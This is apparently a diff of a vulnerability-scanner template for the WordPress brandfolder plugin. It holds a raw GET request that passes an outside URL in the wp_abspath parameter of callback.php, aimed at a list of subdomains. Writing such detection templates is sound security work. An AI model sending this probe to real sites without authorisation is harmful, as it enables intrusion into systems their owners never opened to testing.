@@ -1,15 +1,18 @@
 id: brandfolder-open-redirect
+
 info:
   name: Wordpress brandfolder plugin Open Redirect
   author: 0x_Akoko
   severity: low
   reference: https://www.exploit-db.com/exploits/39591
   tags: wordpress,wp-plugin,lfi,rfi
+
 requests:
   - payloads:
       Subdomains: /home/mahmoud/Wordlist/AllSubdomains.txt
     attack: sniper
     threads: 100
+
     raw:
       - |
         GET /wp-content/plugins/brandfolder/callback.php?wp_abspath=https://example.com/ HTTP/1.1
